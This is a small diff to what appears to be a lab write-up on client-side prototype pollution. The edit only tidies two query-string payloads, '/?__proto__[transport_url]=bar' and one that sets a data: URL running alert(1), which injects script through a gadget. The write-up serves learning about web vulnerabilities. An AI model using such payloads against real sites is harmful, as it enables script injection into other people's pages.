@@ -52,7 +52,7 @@ So basically what is happening is when the property `transport_url` is not **exp
 We test the gadget with a random value
 
 ```
-/?__proto__[transport_url] = bar
+/?__proto__[transport_url]=bar
 ```
 
 ![Pasted image 20250329233224.png](/img/user/Images/Pasted%20image%2020250329233224.png)
@@ -66,7 +66,7 @@ Now look at the **Elements** tab and we notice that the `script` elements has be
 Now we can simply craft an exploit to call `alert` using `data:`
 
 ```
-/?__proto__[transport_url] = data:,alert(1);
+/?__proto__[transport_url]=data:,alert(1);
 ```
 
 ![Pasted image 20250329233851.png](/img/user/Images/Pasted%20image%2020250329233851.png)
